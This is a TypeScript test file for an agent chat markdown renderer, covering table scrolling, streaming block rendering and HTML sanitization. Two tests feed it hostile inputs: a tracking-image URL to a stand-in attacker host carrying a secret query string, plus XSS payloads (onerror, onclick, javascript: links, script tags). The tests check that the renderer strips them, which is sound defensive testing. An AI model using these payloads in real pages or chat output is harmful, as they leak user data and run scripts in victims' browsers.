// apps/web/src/lib/components/agent/agent-chat-markdown.test.ts
// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import {
	AgentMarkdownStreamRenderer,
	closeStreamingMarkdownTail,
	observeAgentMarkdownTables,
	renderAgentMarkdown,
	renderAgentMessageBlocks
} from './agent-chat-markdown';

describe('agent chat markdown tables', () => {
	it('blocks zero-click remote images while preserving first-party relative images', () => {
		const remote = renderAgentMarkdown(
			'![tracking pixel](https://attacker.example/collect?secret=workspace-data)'
		);
		const protocolRelative = renderAgentMarkdown(
			'![tracking pixel](//attacker.example/collect)'
		);
		const firstParty = renderAgentMarkdown(
			'![uploaded image](/api/onto/assets/11111111-1111-4111-8111-111111111111/render)'
		);

		expect(remote).not.toContain('<img');
		expect(remote).not.toContain('attacker.example');
		expect(protocolRelative).not.toContain('<img');
		expect(protocolRelative).not.toContain('attacker.example');
		expect(firstParty).toContain(
			'<img src="/api/onto/assets/11111111-1111-4111-8111-111111111111/render" alt="uploaded image"'
		);
	});

	it('wraps sanitized tables in a dedicated scroll region with a visual cue', () => {
		const html = renderAgentMarkdown(`| Metric | Count |
| --- | ---: |
| Active tasks | 24 |`);

		expect(html).toContain('<div class="agent-markdown-table-shell">');
		expect(html).toContain('class="agent-markdown-table-scroll"');
		expect(html).toContain('<table>');
		expect(html).toContain(
			'class="agent-markdown-table-cue" aria-hidden="true">Scroll →</span>'
		);
	});

	it('does not add table chrome to ordinary markdown', () => {
		const html = renderAgentMarkdown('A paragraph with **emphasis**.');

		expect(html).toContain('<strong>emphasis</strong>');
		expect(html).not.toContain('agent-markdown-table-');
	});

	it('only exposes overflowing tables as keyboard-scrollable regions', () => {
		const root = document.createElement('div');
		root.innerHTML = renderAgentMarkdown(`| Metric | Count |
| --- | ---: |
| Active tasks | 24 |`);
		const scroller = root.querySelector<HTMLElement>('.agent-markdown-table-scroll');
		expect(scroller).not.toBeNull();

		Object.defineProperties(scroller!, {
			clientWidth: { configurable: true, value: 120 },
			scrollWidth: { configurable: true, value: 280 },
			scrollLeft: { configurable: true, value: 0, writable: true }
		});

		const cleanup = observeAgentMarkdownTables(root);
		expect(scroller?.dataset.scrollable).toBe('true');
		expect(scroller?.dataset.atEnd).toBe('false');
		expect(scroller?.parentElement?.dataset.scrollable).toBe('true');
		expect(scroller?.parentElement?.dataset.atEnd).toBe('false');
		expect(scroller?.tabIndex).toBe(0);
		expect(scroller?.getAttribute('role')).toBe('region');
		expect(scroller?.getAttribute('aria-label')).toBe('Scrollable table');

		scroller!.scrollLeft = 160;
		scroller?.dispatchEvent(new Event('scroll'));
		expect(scroller?.dataset.atEnd).toBe('true');
		expect(scroller?.parentElement?.dataset.atEnd).toBe('true');

		cleanup?.();
	});

	it('keeps a table out of the tab order when it fits', () => {
		const root = document.createElement('div');
		root.innerHTML = renderAgentMarkdown(`| Metric | Count |
| --- | ---: |
| Active tasks | 24 |`);
		const scroller = root.querySelector<HTMLElement>('.agent-markdown-table-scroll');
		expect(scroller).not.toBeNull();

		Object.defineProperties(scroller!, {
			clientWidth: { configurable: true, value: 280 },
			scrollWidth: { configurable: true, value: 280 }
		});

		const cleanup = observeAgentMarkdownTables(root);
		expect(scroller?.dataset.scrollable).toBe('false');
		expect(scroller?.parentElement?.dataset.scrollable).toBe('false');
		expect(scroller?.tabIndex).toBe(-1);
		expect(scroller?.hasAttribute('role')).toBe(false);
		expect(scroller?.hasAttribute('aria-label')).toBe(false);

		cleanup?.();
	});

	it('discovers a table added later by streamed markdown', async () => {
		const root = document.createElement('div');
		root.innerHTML = '<p>Streaming response…</p>';
		const cleanup = observeAgentMarkdownTables(root);

		root.innerHTML = renderAgentMarkdown(`| Workstream | Owner | Status |
| --- | --- | --- |
| Positioning | Maya | In progress |`);
		const scroller = root.querySelector<HTMLElement>('.agent-markdown-table-scroll');
		expect(scroller).not.toBeNull();
		Object.defineProperties(scroller!, {
			clientWidth: { configurable: true, value: 160 },
			scrollWidth: { configurable: true, value: 420 }
		});

		await new Promise((resolve) => setTimeout(resolve, 0));
		expect(scroller?.dataset.scrollable).toBe('true');
		expect(scroller?.tabIndex).toBe(0);

		cleanup?.();
	});
});

const squash = (html: string) => html.replace(/>\s+</g, '><').trim();

describe('agent chat markdown blocks', () => {
	const mixedDocument = [
		'## Launch plan',
		'',
		'We should **ship** the `beta` this week.',
		'',
		'- Draft the announcement',
		'- Line up **three** customers',
		'',
		'| Owner | Task |',
		'| --- | --- |',
		'| Maya | Copy |',
		'',
		'```ts',
		'const ready = true;',
		'```',
		'',
		'> Keep it small.'
	].join('\n');

	it('renders plain text as null so the bubble keeps its pre-wrapped text path', () => {
		expect(renderAgentMessageBlocks('Just a plain sentence.')).toBeNull();
		expect(renderAgentMessageBlocks('Plain', { forceMarkdown: true })).toEqual([
			'<p>Plain</p>\n'
		]);
	});

	it('splits a finalized message into blocks that match the whole-message render', () => {
		const blocks = renderAgentMessageBlocks(mixedDocument);
		expect(blocks).toHaveLength(6);
		expect(squash(blocks!.join(''))).toBe(squash(renderAgentMarkdown(mixedDocument)));
		// Same text → same memoized array, so an unchanged bubble does no work.
		expect(renderAgentMessageBlocks(mixedDocument)).toBe(blocks);
	});

	it('streams into the same blocks the finalized render produces', () => {
		const renderer = new AgentMarkdownStreamRenderer();
		let last: string[] | null = null;
		for (let end = 1; end <= mixedDocument.length; end += 7) {
			last = renderer.render(mixedDocument.slice(0, end));
		}
		last = renderer.render(mixedDocument);
		expect(last).toEqual(renderAgentMessageBlocks(mixedDocument));
	});

	it('closes an unterminated bold or code span only in the streaming tail', () => {
		const renderer = new AgentMarkdownStreamRenderer();
		expect(renderer.render('First **done**.\n\nThen **bold wor')).toEqual([
			'<p>First <strong>done</strong>.</p>\n',
			'<p>Then <strong>bold wor</strong></p>\n'
		]);
		expect(renderer.render('First **done**.\n\nThen **bold word** and `npm ru')?.at(-1)).toBe(
			'<p>Then <strong>bold word</strong> and <code>npm ru</code></p>\n'
		);
		expect(renderAgentMessageBlocks('Then **bold wor')).toEqual(['<p>Then **bold wor</p>\n']);
	});

	it('recovers when earlier streamed text is rewritten', () => {
		const renderer = new AgentMarkdownStreamRenderer();
		renderer.render('# Draft one\n\nBody text');
		expect(renderer.render('# Draft two\n\nBody text')).toEqual(
			renderAgentMessageBlocks('# Draft two\n\nBody text')
		);
	});

	it('keeps sanitization for every block, streaming or final', () => {
		const hostile = [
			'**Hello**',
			'',
			'<img src="x" onerror="alert(1)">',
			'',
			'<div onclick="steal()">',
			'',
			'[click](javascript:alert(1)) ![pixel](https://attacker.example/p.gif)',
			'',
			'</div>',
			'',
			'<script>alert(2)</script>'
		].join('\n');
		const renderer = new AgentMarkdownStreamRenderer();
		const outputs: string[] = [];
		for (let end = 1; end <= hostile.length; end += 5) {
			outputs.push((renderer.render(hostile.slice(0, end)) ?? []).join(''));
		}
		outputs.push(renderAgentMessageBlocks(hostile)!.join(''));
		const probe = document.createElement('div');
		for (const html of outputs) {
			probe.innerHTML = html;
			expect(
				probe.querySelector(
					'script, [onerror], [onclick], a[href^="javascript"], img[src*="attacker"]'
				)
			).toBeNull();
		}
	});

	it('renders reference-style links as one document so definitions resolve', () => {
		const text =
			'**Read** [the guide][guide] first.\n\nThen continue.\n\n[guide]: https://example.com/guide';
		const blocks = renderAgentMessageBlocks(text);
		expect(blocks).toHaveLength(1);
		expect(blocks![0]).toContain('href="https://example.com/guide"');
		const streamed = new AgentMarkdownStreamRenderer().render(text);
		expect(streamed![0]).toContain('href="https://example.com/guide"');
	});

	it('keeps indented list nesting and indented code blocks intact per block', () => {
		const text = 'Intro **x**\n\n  - parent\n    - child\n\n    indented();\n';
		const blocks = renderAgentMessageBlocks(text);
		expect(squash(blocks!.join(''))).toBe(squash(renderAgentMarkdown(text)));
	});
});

describe('closeStreamingMarkdownTail', () => {
	it.each([
		['Hello **wor', 'Hello **wor**'],
		['Hello **', 'Hello '],
		['Mix ***both', 'Mix ***both***'],
		['Use `npm i', 'Use `npm i`'],
		['Use `', 'Use '],
		['**done** and `x` ok', '**done** and `x` ok'],
		['2 ** 3 is eight', '2 ** 3 is eight'],
		['- one\n- two **bo', '- one\n- two **bo**'],
		['Escaped \\*\\* stays', 'Escaped \\*\\* stays'],
		['**bold wor\n', '**bold wor**']
	])('%j → %j', (input, expected) => {
		expect(closeStreamingMarkdownTail(input)).toBe(expected);
	});

	it('leaves code fences and non-inline blocks untouched', () => {
		expect(closeStreamingMarkdownTail('```js\nconst a = `x', 'code')).toBe(
			'```js\nconst a = `x'
		);
		expect(closeStreamingMarkdownTail('- item\n  ```\n  let b = `y')).toBe(
			'- item\n  ```\n  let b = `y'
		);
		expect(closeStreamingMarkdownTail('<div>**x', 'html')).toBe('<div>**x');
	});
});

describe('agent chat markdown table observer', () => {
	it('stops tracking a table once its block is replaced', async () => {
		const root = document.createElement('div');
		root.innerHTML = renderAgentMarkdown(`| A | B |
| --- | --- |
| 1 | 2 |`);
		const scroller = root.querySelector<HTMLElement>('.agent-markdown-table-scroll')!;
		Object.defineProperties(scroller, {
			clientWidth: { configurable: true, value: 100 },
			scrollWidth: { configurable: true, value: 300 },
			scrollLeft: { configurable: true, value: 0, writable: true }
		});
		const cleanup = observeAgentMarkdownTables(root);
		expect(scroller.dataset.atEnd).toBe('false');

		root.innerHTML = '<p>Replaced tail</p>';
		await new Promise((resolve) => setTimeout(resolve, 0));
		scroller.scrollLeft = 200;
		scroller.dispatchEvent(new Event('scroll'));
		expect(scroller.dataset.atEnd).toBe('false');

		cleanup?.();
	});
});
